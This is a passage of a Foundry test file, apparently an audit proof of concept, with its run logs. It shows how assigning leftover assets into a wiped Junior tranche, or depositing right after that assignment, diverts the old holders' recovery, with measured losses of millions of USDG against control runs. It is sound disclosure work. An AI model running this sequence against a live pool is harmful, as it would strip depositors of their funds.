        assertGt(s.junior, 11_000_000e6, "b: Junior recovered");
        assertEq(s.senior, s.hwm, "b: Senior whole");
        assertGt(s.unassigned, 0, "b: U still > 0");
        assertGt(pool.getSeniorDepositCapacity(), 0, "b: Senior capacity is positive again");
        assertFalse(pool.canAcceptTrancheDeposits(false), "b: Junior gate closed by U");
        assertFalse(pool.canAcceptTrancheDeposits(true), "b: Senior gate closed by U");
        _keeperMark(P_REVERT);
        vm.prank(NEW_JUNIOR_LP);
        vm.expectRevert(TrancheVault.TrancheVault__DepositsUnavailable.selector);
        juniorVault.requestDeposit(NEW_LP_DEPOSIT, NEW_JUNIOR_LP, NEW_JUNIOR_LP);
        vm.prank(NEW_SENIOR_LP);
        vm.expectRevert(TrancheVault.TrancheVault__DepositsUnavailable.selector);
        seniorVault.requestDeposit(NEW_LP_DEPOSIT, NEW_SENIOR_LP, NEW_SENIOR_LP);
        console2.log("(b) J>0, S=H, U>0: both requests -> DepositsUnavailable (U is the only blocker)");
        console2.log("    Senior capacity while blocked (raw)", pool.getSeniorDepositCapacity());

        // (c) Once U is assigned (here at fair NAV, J > 0) both gates reopen: U was the blocker.
        pool.assignUnassignedAssets(false, RECEIVER);
        assertTrue(pool.canAcceptTrancheDeposits(false), "c: Junior gate open after assignment");
        assertTrue(pool.canAcceptTrancheDeposits(true), "c: Senior gate open after assignment");
        _keeperMark(P_REVERT);
        vm.prank(NEW_JUNIOR_LP);
        juniorVault.requestDeposit(NEW_LP_DEPOSIT, NEW_JUNIOR_LP, NEW_JUNIOR_LP);
        uint256 seniorRoom = pool.getSeniorDepositCapacity();
        console2.log("    Senior capacity after assignment (raw)", seniorRoom);
        vm.prank(NEW_SENIOR_LP);
        seniorVault.requestDeposit(seniorRoom / 2, NEW_SENIOR_LP, NEW_SENIOR_LP);
        console2.log("(c) after assignment: Junior and Senior requests accepted");
    }

    // ---------------------------------------------------------------------
    // 5. Ordinary entry into the same wiped Junior is refused / deferred by the protocol's own rule
    // ---------------------------------------------------------------------

    /// @dev Uses a realized wipe (the trader closes at the wipe price) so no open position accrues value between the
    ///      reconciles: an exact-gap recap then leaves U == 0 and Senior whole, which isolates the J == 0 rule.
    function test_ordinaryEntryIntoWipedJuniorIsDeferred() public {
        // A new Junior LP queues an ordinary deposit before the loss.
        _keeperMark(P_OPEN);
        vm.prank(NEW_JUNIOR_LP);
        uint256 depositId = juniorVault.requestDeposit(NEW_LP_DEPOSIT, NEW_JUNIOR_LP, NEW_JUNIOR_LP);

        // The trader takes the 11.4M profit at 0.40; reconcile wipes Junior (Senior impaired -> entries blocked).
        _trade(LONG_TRADER, CfdTypes.Side.LONG, longSize, 0, true, P_WIPE);
        _settleWithSeniorDust(P_WIPE);
        Snap memory w = _snap();
        _logSnap("realized wipe", w);
        assertEq(w.junior, 0, "Junior wiped");
        assertGt(w.juniorSupply, 0, "Junior supply live");
        assertLt(w.senior, w.hwm, "Senior impaired");

        // Owner recapitalizes exactly the Senior gap; next reconcile restores Senior and leaves U == 0.
        uint256 gap = w.hwm - w.senior;
        _ownerRecap(gap);
        uint256 dustId = _requestSeniorDust();
        _warpTo(pool.lpEpochStart(dustId));
        assertGt(depositId, 0);
        assertLe(depositId, pool.currentLpEpoch(), "deposit epoch matured");
        vm.recordLogs();
        _keeperSettle(P_WIPE);
        (bool found, uint256 juniorDepositAssets, bool entriesDeferred) = _lastLpEpochSettled();
        assertTrue(found, "LpEpochSettled emitted");
        assertEq(juniorDepositAssets, 0, "settlement activated no Junior deposit");
        assertTrue(entriesDeferred, "settlement reports the matured entry as deferred");
        Snap memory r = _snap();
        _logSnap("after exact-gap recap", r);
        assertEq(r.junior, 0, "J still 0");
        assertEq(r.senior, r.hwm, "Senior whole");
        assertEq(r.unassigned, 0, "U == 0 (exact recap, no drift)");
        assertTrue(pool.canSettleDepositEntries(), "common entry gate open: only the J == 0 rule remains");

        // HousePool.sol:917: juniorActivationDeferred -> the matured ordinary deposit is NOT activated.
        assertEq(juniorVault.claimableDepositRequest(depositId, NEW_JUNIOR_LP), 0, "ordinary deposit not activated");
        assertEq(
            juniorVault.pendingDepositRequest(depositId, NEW_JUNIOR_LP), NEW_LP_DEPOSIT, "ordinary deposit deferred"
        );
        // HousePool.sol:494-497 + TrancheVault.sol:1585-1587: new ordinary requests are refused.
        assertFalse(pool.canAcceptTrancheDeposits(false), "Junior request gate closed by the J == 0 rule");
        _keeperMark(P_WIPE);
        vm.prank(NEW_JUNIOR_LP);
        vm.expectRevert(TrancheVault.TrancheVault__TerminallyWiped.selector);
        juniorVault.requestDeposit(NEW_LP_DEPOSIT, NEW_JUNIOR_LP, NEW_JUNIOR_LP);
        // TrancheVault.sol:1366-1367 (LOW-72 fix): the display quote is zeroed, the bootstrap quote is not.
        uint256 displayQuote = juniorVault.estimateDepositShares(NEW_LP_DEPOSIT);
        uint256 bootstrapQuote = juniorVault.quoteBootstrapDeposit(NEW_LP_DEPOSIT);
        assertEq(displayQuote, 0, "estimateDepositShares returns 0 in the wiped state");
        assertEq(
            bootstrapQuote, NEW_LP_DEPOSIT * (juniorVault.totalSupply() + 1000), "quoteBootstrapDeposit prices at 0 NAV"
        );
        console2.log("ordinary deposit pending / claimable (raw)", NEW_LP_DEPOSIT, uint256(0));
        console2.log("estimateDepositShares(1M) =", displayQuote);
        console2.log("quoteBootstrapDeposit(1M) =", bootstrapQuote);
        console2.log("Junior supply             =", juniorVault.totalSupply());

        // The owner path bypasses the rule: 1 USDG of over-recap becomes U and assignment mints ~1e6x the supply.
        _ownerRecap(1e6);
        _settleWithSeniorDust(P_WIPE);
        assertEq(pool.unassignedAssets(), 1e6, "1 USDG over-recap -> U = 1 USDG");
        assertEq(pool.juniorPrincipal(), 0, "J still 0");
        uint256 supplyBefore = juniorVault.totalSupply();
        _keeperMark(P_WIPE);
        pool.assignUnassignedAssets(false, RECEIVER);
        uint256 minted = juniorVault.balanceOf(RECEIVER);
        assertEq(minted, 1e6 * (supplyBefore + 1000), "1 USDG mints 1e6 * (supply + 1000) shares");
        uint256 fraction = (minted * 1e18) / juniorVault.totalSupply();
        console2.log("owner path, U = 1 USDG: receiver share fraction (1e18) =", fraction);
        assertGt(fraction, 0.999998e18, "1 USDG buys > 99.9998% of the wiped tranche");
        // The ordinary deposit that the rule protected is still pending: only the owner path got in.
        assertEq(juniorVault.claimableDepositRequest(depositId, NEW_JUNIOR_LP), 0, "ordinary deposit still deferred");
    }

    // ---------------------------------------------------------------------
    // 6. Honest escape: what waiting buys
    // ---------------------------------------------------------------------

    function test_escape_waitUntilJuniorPrincipalPositive() public {
        _wipeJunior();
        (, Snap memory s2) = _recapGapThenDrift();
        uint256 u = s2.unassigned;
        uint256 snapshotId = vm.snapshotState();

        // Reference: no assignment at all.
        _settleWithSeniorDust(P_REVERT);
        uint256 controlOld = _value(JUNIOR_LP);
        vm.revertToState(snapshotId);

        // (a) Owner waits for the first revenue that reaches Junior (J > 0 but small), then assigns.
        _settleWithSeniorDust(P_SMALL_REVENUE);
        uint256 jSmall = pool.juniorPrincipal();
        assertGt(jSmall, 0, "a: J > 0 after one cent of revenue");
        assertEq(pool.unassignedAssets(), u, "a: U unchanged");
        _keeperMark(P_SMALL_REVENUE);
        pool.assignUnassignedAssets(false, RECEIVER);
        uint256 fracA = (juniorVault.balanceOf(RECEIVER) * 1e18) / juniorVault.totalSupply();
        _settleWithSeniorDust(P_REVERT);
        uint256 oldA = _value(JUNIOR_LP);
        uint256 recvA = _value(RECEIVER);
        vm.revertToState(snapshotId);

        // (b) Owner waits until the mark has reverted (J reflects the recovery), then assigns.
        _settleWithSeniorDust(P_REVERT);
        uint256 jFull = pool.juniorPrincipal();
        _keeperMark(P_REVERT);
        pool.assignUnassignedAssets(false, RECEIVER);
        uint256 fracB = (juniorVault.balanceOf(RECEIVER) * 1e18) / juniorVault.totalSupply();
        uint256 oldB = _value(JUNIOR_LP);
        uint256 recvB = _value(RECEIVER);
        vm.revertToState(snapshotId);

        // (c) Same wait, Senior target: after recovery J > 0 restores Senior capacity, so Senior also works.
        _settleWithSeniorDust(P_REVERT);
        uint256 capC = pool.getSeniorDepositCapacity();
        _keeperMark(P_REVERT);
        bool seniorOk = capC >= u;
        if (seniorOk) {
            pool.assignUnassignedAssets(true, RECEIVER);
        }
        uint256 oldC = _value(JUNIOR_LP);

        console2.log("=== ESCAPE: assignment timing (raw 6-dec USDG) ===");
        console2.log("  U                                         ", u);
        console2.log("  control (never assign) old holder value   ", controlOld);
        console2.log("  (a) assign at small J: J at assignment    ", jSmall);
        console2.log("      receiver fraction (1e18)              ", fracA);
        console2.log("      old holder / receiver after reversion ", oldA, recvA);
        console2.log("      old holder loss vs control            ", controlOld - oldA);
        console2.log("  (b) assign after reversion: J at assign   ", jFull);
        console2.log("      receiver fraction (1e18)              ", fracB);
        console2.log("      old holder / receiver value           ", oldB, recvB);
        console2.log("  (c) Senior capacity after reversion       ", capC);
        console2.log("      Senior assignment possible / old value", seniorOk ? 1 : 0, oldC);

        // (a) J > 0 alone is not enough: pricing is at NAV J, so the receiver still buys U/(J+U) of the recovery.
        assertApproxEqRel(fracA, (u * 1e18) / (u + jSmall), 0.01e18, "a: receiver fraction = U/(J+U)");
        assertGt(controlOld - oldA, 5_000_000e6, "a: old holders still lose > 5M when J is small");
        // (b) After the recovery is in J, NAV pricing is fair: receiver gets ~U, old holder ~= control.
        assertApproxEqAbs(recvB, u, 1e6, "b: receiver gets ~U of value");
        assertApproxEqAbs(oldB, controlOld, 1e6, "b: old holder ~= control");
        // (c) Senior target becomes available once J recovered.
        assertTrue(seniorOk, "c: Senior capacity covers U after recovery");
        assertApproxEqAbs(oldC, controlOld, 1e6, "c: old holder ~= control");
    }

    // ---------------------------------------------------------------------
    // 7. Variant with only 10% moves (no single 60% move)
    // ---------------------------------------------------------------------

    /// @notice Same mechanism when Junior is first worn down by realized 10% trader wins (as in the sponsor-style
    ///         RecapHwmReset stage 1) and the final wipe is an unrealized 10% move that later reverts.
    function test_variant_tenPercentMoves_redirectsRecovery() public {
        uint256 pHigh = 1e8;
        uint256 pLow = 0.9e8;
        uint256 pDrift = 0.901e8; // +0.1 cent favourable drift before the recap is applied

        // Flatten the setUp LONG at the open price.
        _trade(LONG_TRADER, CfdTypes.Side.LONG, longSize, 0, true, pHigh);
        settlementToken.mint(LONG_TRADER, 20_000_000e6);
        vm.startPrank(LONG_TRADER);
        settlementToken.approve(address(clearinghouse), 20_000_000e6);
        clearinghouse.deposit(LONG_TRADER, 20_000_000e6);
        vm.stopPrank();

        // Realized rounds: open LONG at 1.00, basket falls 10%, trader closes at 0.90; basket returns with no
        // position open. Stop once one more 10% move on a full-skew position exceeds what is left of Junior.
        uint256 rounds;
        while (rounds < 20) {
            uint256 notional = (pool.totalAssets() * 39) / 100;
            if (juniorVault.totalAssets() * 10 < (notional * 9) / 10) {
                break;
            }
            uint256 size = _sizeFor(notional, pHigh);
            _trade(LONG_TRADER, CfdTypes.Side.LONG, size, notional / 20, false, pHigh);
            _trade(LONG_TRADER, CfdTypes.Side.LONG, size, 0, true, pLow);
            ++rounds;
        }
        uint256 finalNotional = (pool.totalAssets() * 39) / 100;
        uint256 finalSize = _sizeFor(finalNotional, pHigh);
        _trade(LONG_TRADER, CfdTypes.Side.LONG, finalSize, finalNotional / 20, false, pHigh);
        uint256 jBeforeWipe = juniorVault.totalAssets();
        uint256 oldBeforeWipe = _value(JUNIOR_LP);
        console2.log("=== VARIANT: realized 10% rounds ===", rounds);
        console2.log("  projected Junior before the final move (raw)", jBeforeWipe);
        console2.log("  final LONG notional at 1.00 (raw)           ", finalNotional);

        // Final unrealized 10% move wipes Junior; owner recaps the gap; +0.1c drift leaves U.
        _settleWithSeniorDust(pLow);
        Snap memory w = _snap();
        _logSnap("variant: mark 0.90, settleLpEpoch", w);
        assertEq(w.junior, 0, "variant: Junior wiped");
        assertGt(w.juniorSupply, 0, "variant: Junior supply live");
        assertLt(w.senior, w.hwm, "variant: Senior impaired");
        assertFalse(w.degraded, "variant: not degraded");
        _ownerRecap(w.hwm - w.senior);
        _settleWithSeniorDust(pDrift);
        Snap memory d = _snap();
        _logSnap("variant: gap recap + drift to 0.901", d);
        assertEq(d.junior, 0, "variant: J = 0");
        assertEq(d.senior, d.hwm, "variant: Senior whole");
        assertGt(d.unassigned, 0, "variant: U > 0");

        uint256 snapshotId = vm.snapshotState();
        _keeperMark(pDrift);
        pool.assignUnassignedAssets(false, RECEIVER);
        _settleWithSeniorDust(pHigh);
        Outcome memory attack = _outcome();
        _logOutcome("VARIANT ATTACK: assign at J = 0, mark reverts to 1.00", attack);
        vm.revertToState(snapshotId);
        _settleWithSeniorDust(pHigh);
        Outcome memory control = _outcome();
        _logOutcome("VARIANT CONTROL: no assignment", control);

        uint256 loss = control.oldHolderValue - attack.oldHolderValue;
        console2.log("  old holder value before the final move (raw)", oldBeforeWipe);
        console2.log("  U (raw)                                     ", d.unassigned);
        console2.log("  old Junior holder loss vs control (raw)     ", loss);
        assertGt(attack.receiverFractionWad, 0.999999e18, "variant: receiver > 99.9999% of supply");
        assertLt(attack.oldHolderValue, 1e6, "variant: old holder < 1 USDG");
        assertGt(loss, 1_000_000e6, "variant: old holders lose > 1M USDG of recovery");
    }

    // ---------------------------------------------------------------------
    // 8. Any unprivileged depositor buys the wiped holders' recovery after the assignment
    // ---------------------------------------------------------------------

    /// @notice The assignment revives the wiped tranche for ordinary entry at a Junior NAV of ~U. An unprivileged LP
    ///         whose deposit activates before the reversion is reconciled is priced at that NAV and takes D / (U + D)
    ///         of the recovery that belonged to the wiped holders. Without the assignment the same request reverts
    ///         TrancheVault__TerminallyWiped (TrancheVault.sol:1585-1587).
    function test_outsiderDepositAfterAssignment_capturesRecovery() public {
        _wipeJunior();
        _recapGapThenDrift();
        uint256 depositAssets = NEW_LP_DEPOSIT; // 1_000_000 USDG from an unprivileged LP
        uint256 snapshotId = vm.snapshotState();

        // ---- CONTROL: no assignment. The outsider cannot enter; the old holder keeps the recovery ----
        _keeperMark(P_DRIFT);
        vm.prank(NEW_JUNIOR_LP);
        vm.expectRevert(TrancheVault.TrancheVault__TerminallyWiped.selector);
        juniorVault.requestDeposit(depositAssets, NEW_JUNIOR_LP, NEW_JUNIOR_LP);
        _settleWithSeniorDust(P_REVERT);
        uint256 controlOldHolder = _value(JUNIOR_LP);
        vm.revertToState(snapshotId);

        // ---- ATTACK: the owner assigns U, then an unprivileged LP deposits before the reversion ----
        _keeperMark(P_DRIFT);
        pool.assignUnassignedAssets(false, RECEIVER);
        uint256 juniorAtEntry = pool.juniorPrincipal();
        _keeperMark(P_DRIFT);
        uint256 walletBefore = settlementToken.balanceOf(NEW_JUNIOR_LP);
        vm.prank(NEW_JUNIOR_LP);
        uint256 requestId = juniorVault.requestDeposit(depositAssets, NEW_JUNIOR_LP, NEW_JUNIOR_LP);
        _warpTo(juniorVault.depositEpochStart(requestId));
        _keeperSettle(P_DRIFT); // the mark is still depressed: the deposit activates at Junior NAV ~= U
        uint256 claimable = juniorVault.claimableDepositRequest(requestId, NEW_JUNIOR_LP);
        assertEq(claimable, depositAssets, "outsider deposit activated in full");
        vm.prank(NEW_JUNIOR_LP);
        uint256 outsiderShares = juniorVault.claimDeposit(requestId, claimable, NEW_JUNIOR_LP, NEW_JUNIOR_LP);
        uint256 fractionWad = (outsiderShares * 1e18) / juniorVault.totalSupply();

        _settleWithSeniorDust(P_REVERT);
        uint256 outsiderValue = _value(NEW_JUNIOR_LP);
        uint256 receiverValue = _value(RECEIVER);
        uint256 oldHolderValue = _value(JUNIOR_LP);
        uint256 juniorAfter = pool.juniorPrincipal();

        // The outsider takes real cash out through the permissionless settlement path.
        uint256 cashOut = _redeemJuniorWorth(NEW_JUNIOR_LP, 2 * depositAssets);
        uint256 walletAfter = settlementToken.balanceOf(NEW_JUNIOR_LP);

        console2.log("=== OUTSIDER: unprivileged deposit after the assignment (raw 6-dec USDG) ===");
        console2.log("  Junior principal when the deposit activates ", juniorAtEntry);
        console2.log("  outsider deposit                             ", depositAssets);
        console2.log("  outsider share fraction at entry (1e18)      ", fractionWad);
        console2.log("  Junior principal after the reversion         ", juniorAfter);
        console2.log("  outsider claimable value after the reversion ", outsiderValue);
        console2.log("  outsider profit on paper                     ", outsiderValue - depositAssets);
        console2.log("  receiver claimable value                     ", receiverValue);
        console2.log("  old Junior holder value  attack/control      ", oldHolderValue, controlOldHolder);
        console2.log("  outsider redeemed in cash (raw)              ", cashOut);
        console2.log("  outsider wallet before deposit / after cash  ", walletBefore, walletAfter);

        assertLt(juniorAtEntry, 200_000e6, "deposit priced against a Junior NAV of ~U");
        assertGt(fractionWad, 0.8e18, "a 1M deposit buys > 80% of the revived tranche");
        assertGt(outsiderValue, 9_000_000e6, "outsider holds > 9M USDG of Junior value after the reversion");
        assertGt(controlOldHolder, 11_000_000e6, "control: the wiped holder recovers > 11M USDG");
        assertLt(oldHolderValue, 1e6, "attack: the wiped holder is left with < 1 USDG");
        assertGt(cashOut, depositAssets, "outsider withdraws more cash than it deposited");
        assertGt(walletAfter, walletBefore, "outsider wallet ends above its starting balance");
    }

    // ---------------------------------------------------------------------
    // Shared stages
    // ---------------------------------------------------------------------

    /// @dev Mark falls to 0.40 and the permissionless settleLpEpoch reconciles: Junior wiped, Senior impaired.
    function _wipeJunior() internal returns (Snap memory s) {
        _settleWithSeniorDust(P_WIPE);
        s = _snap();
        _logSnap("stage 1: mark 0.40, settleLpEpoch reconciles the loss", s);
        assertEq(s.junior, 0, "Junior principal wiped");
        assertGt(s.juniorSupply, 0, "Junior share supply survives (seed floor + old LP)");
        assertLt(s.senior, s.hwm, "Senior impaired");
        assertEq(s.unassigned, 0, "no ownerless assets yet");
        assertFalse(s.degraded, "not degraded");
        assertEq(s.deficit, 0, "no terminal deficit");
    }

    /// @dev Owner recapitalizes exactly the observed Senior gap; the mark drifts +1 cent before the next reconcile.
    function _recapGapThenDrift() internal returns (uint256 gap, Snap memory s) {
        gap = pool.seniorHighWaterMark() - pool.seniorPrincipal();
        _ownerRecap(gap);
        assertEq(pool.pendingRecapitalizationAssets(), gap, "recap only queues");
        _settleWithSeniorDust(P_DRIFT);
        s = _snap();
        _logSnap("stage 2: owner recaps the gap, mark drifts to 0.41, settleLpEpoch", s);
        console2.log("  recap amount (gap)   ", gap);
        assertEq(s.pendingRecap, 0, "recap applied");
        assertEq(s.junior, 0, "Junior principal still 0");
        assertGt(s.juniorSupply, 0, "Junior supply live");
        assertEq(s.senior, s.hwm, "Senior whole (drift restored part, recap the rest)");
        assertGt(s.unassigned, 0, "recap remainder became ownerless U");
    }

    // ---------------------------------------------------------------------
    // Helpers
    // ---------------------------------------------------------------------

    function _ownerRecap(
        uint256 amount
    ) internal {
        settlementToken.mint(address(this), amount);
        settlementToken.approve(address(engine), amount);
        engine.recapitalizePool(amount);
    }

    /// @dev Production Router FIFO: commit (test adapter -> production V3 commitOrder) then keeper executeOrder.
    function _trade(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose,
        uint256 price
    ) internal {
        _tick();
        vm.prank(account);
        uint64 orderId = router.commitOrder(side, size, margin, 0, isClose);
        bytes[] memory data = _mockPythUpdateData(price);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, data);
        assertEq(uint256(result.status), uint256(OrderV3Types.LifecycleStatus.Executed), "order executed");
    }

    /// @dev An ordinary Senior LP's 2-USDG redemption request gives settleLpEpoch matured work.
    function _requestSeniorDust() internal returns (uint256 requestId) {
        uint256 cooldownEnd = seniorVault.lastDepositTime(SENIOR_LP) + seniorVault.DEPOSIT_COOLDOWN();
        if (vm.getBlockTimestamp() < cooldownEnd) {
            vm.warp(cooldownEnd);
        }
        uint256 balance = seniorVault.balanceOf(SENIOR_LP);
        uint256 value = seniorVault.estimateRedeemAssets(balance);
        uint256 shares = (balance * 2e6) / value + 1;
        vm.prank(SENIOR_LP);
        requestId = seniorVault.requestRedeem(shares, SENIOR_LP, SENIOR_LP);
    }

    function _settleWithSeniorDust(
        uint256 price
    ) internal {
        uint256 requestId = _requestSeniorDust();
        _warpTo(pool.lpEpochStart(requestId));
        _keeperSettle(price);
    }

    function _redeemJuniorWorth(
        address holder,
        uint256 assets
    ) internal returns (uint256 received) {
        uint256 cooldownEnd = juniorVault.lastDepositTime(holder) + juniorVault.DEPOSIT_COOLDOWN();
        if (vm.getBlockTimestamp() < cooldownEnd) {
            vm.warp(cooldownEnd);
        }
        uint256 balance = juniorVault.balanceOf(holder);
        uint256 shares = (balance * assets) / juniorVault.estimateRedeemAssets(balance);
        vm.prank(holder);
        uint256 requestId = juniorVault.requestRedeem(shares, holder, holder);
        _warpTo(pool.lpEpochStart(requestId));
        _keeperSettle(P_REVERT);
        uint256 claimable = juniorVault.claimableRedeemRequest(requestId, holder);
        uint256 balBefore = settlementToken.balanceOf(holder);
        vm.prank(holder);
        juniorVault.claimRedeem(requestId, claimable, holder, holder);
        received = settlementToken.balanceOf(holder) - balBefore;
    }

    /// @dev Permissionless production path: OrderRouter.settleLpEpoch (OrderRouter.sol:479-484).
    function _keeperSettle(
        uint256 price
    ) internal {
        bytes[] memory data = _mockPythUpdateData(price);
        vm.prank(KEEPER);
        router.settleLpEpoch(data);
    }

    function _keeperMark(
        uint256 price
    ) internal {
        bytes[] memory data = _mockPythUpdateData(price);
        vm.prank(KEEPER);
        router.updateMarkPrice(data);
    }

    /// @dev Decodes the last HousePool.LpEpochSettled (HousePool.sol:118-127) from recorded logs.
    function _lastLpEpochSettled() internal returns (bool found, uint256 juniorDepositAssets, bool entriesDeferred) {
        Vm.Log[] memory logs = vm.getRecordedLogs();
        bytes32 topic =
            keccak256("LpEpochSettled(uint256,uint256,uint256,uint256,uint256,bool,bool,bool)");
        for (uint256 i = logs.length; i > 0; --i) {
            Vm.Log memory entry = logs[i - 1];
            if (entry.emitter == address(pool) && entry.topics.length > 0 && entry.topics[0] == topic) {
                (,, uint256 jDeposit,,,, bool deferred) =
                    abi.decode(entry.data, (uint256, uint256, uint256, uint256, bool, bool, bool));
                return (true, jDeposit, deferred);
            }
        }
    }

    function _value(
        address holder
    ) internal view returns (uint256) {
        return juniorVault.estimateRedeemAssets(juniorVault.balanceOf(holder));
    }

    function _outcome() internal view returns (Outcome memory o) {
        o.receiverShares = juniorVault.balanceOf(RECEIVER);
        o.juniorSupply = juniorVault.totalSupply();
        o.receiverFractionWad = (o.receiverShares * 1e18) / o.juniorSupply;
        o.oldHolderValue = _value(JUNIOR_LP);
        o.receiverValue = _value(RECEIVER);
        o.juniorPrincipal = pool.juniorPrincipal();
        o.unassigned = pool.unassignedAssets();
        o.seniorPrincipal = pool.seniorPrincipal();
        o.hwm = pool.seniorHighWaterMark();
    }

    function _snap() internal view returns (Snap memory s) {
        s.senior = pool.seniorPrincipal();
        s.junior = pool.juniorPrincipal();
        s.hwm = pool.seniorHighWaterMark();
        s.unassigned = pool.unassignedAssets();
        s.pendingRecap = pool.pendingRecapitalizationAssets();
        s.juniorSupply = juniorVault.totalSupply();
        s.poolAssets = pool.totalAssets();
        s.deficit = pool.terminalDeficitAssets();
        s.degraded = engine.degradedMode();
    }

    function _sizeFor(
        uint256 notionalAssets,
        uint256 price
    ) internal pure returns (uint256 size) {
        size = ((notionalAssets * 1e20) / price / 1e20) * 1e20;
    }

    function _warpTo(
        uint256 t
    ) internal {
        if (vm.getBlockTimestamp() < t) {
            vm.warp(t);
        }
        vm.roll(vm.getBlockNumber() + 1);
    }

    function _tick() internal {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
    }

    function _whole(
        uint256 raw
    ) internal pure returns (uint256) {
        return raw / 1e6;
    }

    function _logSnap(
        string memory label,
        Snap memory s
    ) internal pure {
        console2.log("=====", label, "=====");
        console2.log("  seniorPrincipal      ", s.senior);
        console2.log("  seniorHighWaterMark  ", s.hwm);
        console2.log("  juniorPrincipal      ", s.junior);
        console2.log("  unassignedAssets     ", s.unassigned);
        console2.log("  pendingRecap         ", s.pendingRecap);
        console2.log("  junior share supply  ", s.juniorSupply);
        console2.log("  pool.totalAssets     ", s.poolAssets);
        console2.log("  terminalDeficit      ", s.deficit);
        console2.log("  degradedMode         ", s.degraded);
    }

    function _logOutcome(
        string memory label,
        Outcome memory o
    ) internal pure {
        console2.log("=====", label, "=====");
        console2.log("  seniorPrincipal / HWM              ", o.seniorPrincipal, o.hwm);
        console2.log("  juniorPrincipal                    ", o.juniorPrincipal);
        console2.log("  unassignedAssets                   ", o.unassigned);
        console2.log("  junior supply / receiver shares    ", o.juniorSupply, o.receiverShares);
        console2.log("  receiver share fraction (1e18)     ", o.receiverFractionWad);
        console2.log("  old Junior holder claimable value  ", o.oldHolderValue);
        console2.log("  receiver claimable value           ", o.receiverValue);
    }

}
```

output:

```
Ran 8 tests for test/perps/poc/WipedJuniorAssignment.t.sol:WipedJuniorAssignmentTest
[PASS] test_assignIntoWipedJunior_redirectsRecovery() (gas: 5307684)
Logs:
  ===== stage 0: funded pool, 19M LONG open at 1.00 =====
    seniorPrincipal       39000001000675
    juniorPrincipal       10000000999325
    unassignedAssets      0
    junior share supply   10006665431847178
  old Junior holder value before the wipe (USDG) 10036836
  ===== stage 1: mark 0.40, settleLpEpoch reconciles the loss =====
    seniorPrincipal       37636836803114
    juniorPrincipal       0
    unassignedAssets      0
    junior share supply   10006665431847178
  ===== stage 2: owner recaps the gap, mark drifts to 0.41, settleLpEpoch =====
    seniorPrincipal       39000709428377
    juniorPrincipal       0
    unassignedAssets      190000000000
    junior share supply   10006665431847178
    recap amount (gap)    1363874625263
  === ATTACK: assignUnassignedAssets(false, RECEIVER) at J = 0 ===
    assigned U (raw 6-dec)                   190000000000
    Junior supply before assignment          10006665431847178
    receiver shares minted                   1901266432051153820000000000
    receiver share fraction right after (1e18) 999999999994736842
    receiver value right after (raw)         190000000000
    old holder value right after (raw)       0
    Junior deposit gate after assignment     true
  ===== ATTACK: after the mark reverts to 1.00 and LP settlement runs =====
    seniorPrincipal / HWM               39001063500285 39001063500285
    juniorPrincipal                     11399643928074
    unassignedAssets                    0
    junior supply / receiver shares     1901266432061160485431847178 1901266432051153820000000000
    receiver share fraction (1e18)      999999999994736842
    old Junior holder claimable value   59
    receiver claimable value            11399643928015
    receiver redeemed in USDG through settleLpEpoch (raw) 999968764361
  ===== CONTROL: no assignment, same reversion =====
    seniorPrincipal / HWM               39000707428377 39000707428377
    juniorPrincipal                     11210000000000
    unassignedAssets                    190000000000
    junior supply / receiver shares     10006665431847178 0
    receiver share fraction (1e18)      0
    old Junior holder claimable value   11209998879746
    receiver claimable value            0
  === SUMMARY (raw 6-dec USDG) ===
    Senior gap recapitalized by owner        1363874625263
    unassigned U created by the +1c drift    190000000000
    old Junior holder value  attack/control  59 11209998879746
    receiver value           attack/control  11399643928015 0
    old Junior holder loss vs control        11209998879687
    receiver gain minus U it was assigned    11209643928015

[PASS] test_control_noAssignment_oldJuniorRecovers() (gas: 4424415)
Logs:
  ===== stage 1: mark 0.40, settleLpEpoch reconciles the loss =====
    seniorPrincipal       37636836803114
    juniorPrincipal       0
    unassignedAssets      0
    junior share supply   10006665431847178
  ===== CONTROL B: no recap, no assignment =====
    seniorPrincipal / HWM               39000707293837 39000707293837
    juniorPrincipal                     10036125437116
    unassignedAssets                    0
    junior supply / receiver shares     10006665431847178 0
    receiver share fraction (1e18)      0
    old Junior holder claimable value   10036124434171
    receiver claimable value            0
    B: old holder recovery without any owner action (raw) 10036124434171
  ===== stage 2: owner recaps the gap, mark drifts to 0.41, settleLpEpoch =====
    seniorPrincipal       39000709428377
    juniorPrincipal       0
    unassignedAssets      190000000000
    junior share supply   10006665431847178
    recap amount (gap)    1363874625263
  ===== CONTROL (standalone): no assignment =====
    seniorPrincipal / HWM               39000707428377 39000707428377
    juniorPrincipal                     11210000000000
    unassignedAssets                    190000000000
    junior supply / receiver shares     10006665431847178 0
    receiver share fraction (1e18)      0
    old Junior holder claimable value   11209998879746
    receiver claimable value            0
    old holder value before wipe (raw) 10036836531630

[PASS] test_escape_waitUntilJuniorPrincipalPositive() (gas: 6627703)
Logs:
  ===== stage 1: mark 0.40, settleLpEpoch reconciles the loss =====
    seniorPrincipal       37636836803114
    juniorPrincipal       0
    unassignedAssets      0
    junior share supply   10006665431847178
  ===== stage 2: owner recaps the gap, mark drifts to 0.41, settleLpEpoch =====
    seniorPrincipal       39000709428377
    juniorPrincipal       0
    unassignedAssets      190000000000
    junior share supply   10006665431847178
    recap amount (gap)    1363874625263
  === ESCAPE: assignment timing (raw 6-dec USDG) ===
    U                                          190000000000
    control (never assign) old holder value    11209998879746
    (a) assign at small J: J at assignment     190000000000
        receiver fraction (1e18)               500000130177690432
        old holder / receiver after reversion  5699819860996 5699823398557
        old holder loss vs control             5510179018750
    (b) assign after reversion: J at assign    11210000000000
        receiver fraction (1e18)               16666666811310097
        old holder / receiver value            11209998780810 189999999999
    (c) Senior capacity after reversion        999292571623
        Senior assignment possible / old value 1 11209998780810

[PASS] test_ordinaryEntryIntoWipedJuniorIsDeferred() (gas: 4849990)
Logs:
  ===== realized wipe =====
    seniorPrincipal       37633987315038
    juniorPrincipal       0
    unassignedAssets      0
    junior share supply   10006665431847178
  ===== after exact-gap recap =====
    seniorPrincipal       39000709355762
    juniorPrincipal       0
    unassignedAssets      0
    junior share supply   10006665431847178
  ordinary deposit pending / claimable (raw) 1000000000000 0
  estimateDepositShares(1M) = 0
  quoteBootstrapDeposit(1M) = 10006665431848178000000000000
  Junior supply             = 10006665431847178
  owner path, U = 1 USDG: receiver share fraction (1e18) = 999999000000999999

